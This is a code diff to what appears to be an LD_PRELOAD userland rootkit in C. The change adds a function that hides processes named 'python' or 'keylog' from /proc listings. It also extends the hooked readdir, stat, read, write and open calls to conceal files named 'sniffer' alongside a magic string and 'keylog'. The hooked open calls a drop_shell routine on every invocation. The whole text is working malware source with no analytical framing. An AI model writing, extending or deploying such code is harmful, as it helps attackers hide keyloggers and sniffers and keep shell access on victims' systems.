@@ -57,11 +57,42 @@ void __attribute__((constructor)) _init() {
     old_fopen = dlsym (handle, "fopen");
 }
 
+int hidden_process(DIR *dirp, char *pid) {
+    int fd = dirfd(dirp);
+
+    char procname[NAME_MAX];
+
+    get_fname(fd, procname);
+
+    if (strcmp(procname, "/proc") == 0) {
+        if (strspn(pid, "0123456789") != strlen(pid))
+            return 0;
+
+        char tmp[256];
+        snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
+
+        FILE* f = fopen(tmp, "r");
+        if(f == NULL)
+            return 0;
+
+        if(fgets(tmp, sizeof(tmp), f) == NULL) {
+            fclose(f);
+            return 0;
+        }
+
+        fclose(f);
+
+        return strstr(tmp, "python") || strstr(tmp, "keylog");
+    } else {
+        return 0;
+    }
+}
+
 struct dirent *readdir(DIR *dirp) {
     struct dirent *dir;
 
     while((dir = old_readdir(dirp))) {
-        if (!strstr(dir->d_name, MAGIC_STR) && !strstr(dir->d_name, "keylog"))
+        if (!strstr(dir->d_name, MAGIC_STR) && !strstr(dir->d_name, "keylog") && !strstr(dir->d_name, "sniffer") && !hidden_process(dirp, dir->d_name))
             break;
     }
 
@@ -69,7 +100,7 @@ struct dirent *readdir(DIR *dirp) {
 }
 
 int __xstat(int ver, const char *path, struct stat *buf) {
-    if (strstr(path, MAGIC_STR) || strstr(path, "keylog")) {
+    if (strstr(path, MAGIC_STR) || strstr(path, "keylog") || strstr(path, "sniffer")) {
         errno = ENOENT;
         return -1;
     } else {
@@ -78,7 +109,7 @@ int __xstat(int ver, const char *path, struct stat *buf) {
 }
 
 int __lxstat(int ver, const char *path, struct stat *buf) {
-    if (strstr(path, MAGIC_STR) || strstr(path, "keylog")) {
+    if (strstr(path, MAGIC_STR) || strstr(path, "keylog") || strstr(path, "sniffer")) {
         errno = ENOENT;
         return -1;
     } else {
@@ -91,7 +122,7 @@ int __fxstat(int ver, int fd, struct stat *buf) {
 
     get_fname(fd, fname);
 
-    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog")) {
+    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog") || strstr(fname, "sniffer")) {
         errno = ENOENT;
         return -1;
     } else {
@@ -104,7 +135,7 @@ ssize_t read(int fd, void *buf, size_t count) {
 
     get_fname(fd, fname);
 
-    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog")) {
+    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog") || strstr(fname, "sniffer")) {
         errno = EIO;
         return -1;
     } else {
@@ -117,7 +148,7 @@ ssize_t write(int fd, const void *buf, size_t count) {
 
     get_fname(fd, fname);
 
-    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog")) {
+    if (strstr(fname, MAGIC_STR) || strstr(fname, "keylog") || strstr(fname, "sniffer")) {
         errno = EIO;
         return -1;
     } else {
@@ -128,7 +159,7 @@ ssize_t write(int fd, const void *buf, size_t count) {
 int open(const char *path, int flags, mode_t mode) {
     drop_shell();
 
-    if (strstr(path, MAGIC_STR) || strstr(path, "keylog")) {
+    if (strstr(path, MAGIC_STR) || strstr(path, "keylog") || strstr(path, "sniffer")) {
         errno = ENOENT;
         return -1;
     } else {
